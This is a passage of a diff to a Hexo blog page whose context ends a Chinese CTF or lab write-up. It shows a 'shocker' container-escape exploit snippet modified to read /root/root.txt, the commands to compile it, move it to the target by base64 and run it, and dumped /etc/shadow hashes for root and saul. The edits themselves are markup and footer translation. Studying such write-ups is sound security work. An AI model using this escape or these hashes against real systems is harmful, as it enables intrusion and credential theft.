 <p>没有curl和wget，还是通过base64写文件进去运行，自己修改c代码获取需要的文件内容：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// get a FS reference from something mounted in from outside</span><br><span class="line">if ((fd1 = open("/etc/hostname", O_RDONLY)) &lt; 0)</span><br><span class="line">    die("[-] open");</span><br><span class="line"></span><br><span class="line">if (find_handle(fd1, "/root/root.txt", &amp;root_h, &amp;h) &lt;= 0)</span><br><span class="line">    die("[-] Cannot find valid handle!");</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">gcc shocker.c -o shocker</span><br><span class="line">base64 shocker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">echo xxx | base64 -d &gt; shocker</span><br><span class="line">chmod +x shocker</span><br><span class="line">./shocker</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042118.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042118.jpg" alt=""></p>
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$9GrOpvcijuCP93rg$tkcyh.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::</span><br><span class="line">saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3&#x2F;S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
@@ -424,7 +310,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2022-08-29T01:26:03.143Z" itemprop="dateUpdated">2022-08-29 09:26:03</time>
+    Last updated: <time datetime="2022-08-29T01:26:03.143Z" itemprop="dateUpdated">2022-08-29 09:26:03</time>
 </span><br>
 
 
@@ -591,11 +477,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
